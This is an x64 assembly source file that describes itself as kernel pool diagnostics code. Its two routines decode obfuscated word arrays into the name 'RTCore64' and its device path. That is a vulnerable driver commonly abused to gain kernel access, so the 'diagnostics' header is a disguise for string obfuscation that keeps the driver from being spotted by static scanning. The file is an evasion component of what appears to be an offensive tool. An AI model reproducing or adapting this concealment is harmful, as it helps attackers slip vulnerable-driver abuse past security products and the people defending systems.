; ==============================================================================
; From KvcProject: Kernel Pool Diagnostics & Memory Telemetry Subsystem
; Dynamic reconstitution unit for supervisor pool monitoring and diagnostics.
; Architecture: x64 | Zero-CRT | Non-paged execution profile
; ==============================================================================

.data
ALIGN 8
_EncodedData    dw 0769Ah, 0569Ah, 0669Bh, 026A4h, 076A4h, 046A5h, 0B698h, 05698h, 0169Fh
_DevEncodedData dw 0D69Ah, 0D69Ah, 03698h, 0D69Ah, 0769Ah, 0569Ah, 0669Bh, 026A4h, 076A4h, 046A5h, 0B698h, 05698h, 0169Fh
_XorKey         dw 037C5h
_SubConst       dw 15A2h
_State          db 0
_DevState       db 0
ALIGN 8
_DecodedBuffer  dw 9 dup(0)
ALIGN 8
_DevBuffer      dw 13 dup(0)

.code
ALIGN 16

_DecodeBuffer PROC
    push rdi
    push rsi
    push rbx
    push r12
    mov rsi, rdx
    mov rdi, r8
    mov r12, rcx
    mov r9w, _XorKey
xor_loop:
    mov ax, [rsi]
    xor ax, r9w
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop xor_loop

    mov rsi, r8
    mov rdi, r8
    mov rcx, r12
rol_loop:
    mov ax, [rsi]
    rol ax, 4
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop rol_loop

    mov rsi, r8
    mov rdi, r8
    mov rcx, r12
    mov r9w, _SubConst
sub_loop:
    mov ax, [rsi]
    sub ax, r9w
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop sub_loop

    pop r12
    pop rbx
    pop rsi
    pop rdi
    ret
_DecodeBuffer ENDP

PUBLIC MmGetPoolDiagnosticString
MmGetPoolDiagnosticString PROC
    sub rsp, 28h
    cmp _State, 2
    je return_result
    cmp _State, 1
    je wait_for_completion
    mov _State, 1
    mov rcx, 9
    lea rdx, _EncodedData
    lea r8, _DecodedBuffer
    call _DecodeBuffer
    mov _State, 2
    jmp return_result
wait_for_completion:
    pause
    cmp _State, 2
    jne wait_for_completion
return_result:
    lea rax, _DecodedBuffer
    add rsp, 28h
    ret
MmGetPoolDiagnosticString ENDP

PUBLIC MmGetPoolDiagnosticDeviceString
MmGetPoolDiagnosticDeviceString PROC
    sub rsp, 28h
    cmp _DevState, 2
    je dev_return
    cmp _DevState, 1
    je dev_wait
    mov _DevState, 1
    mov rcx, 13
    lea rdx, _DevEncodedData
    lea r8, _DevBuffer
    call _DecodeBuffer
    mov _DevState, 2
    jmp dev_return
dev_wait:
    pause
    cmp _DevState, 2
    jne dev_wait
dev_return:
    lea rax, _DevBuffer
    add rsp, 28h
    ret
MmGetPoolDiagnosticDeviceString ENDP

END
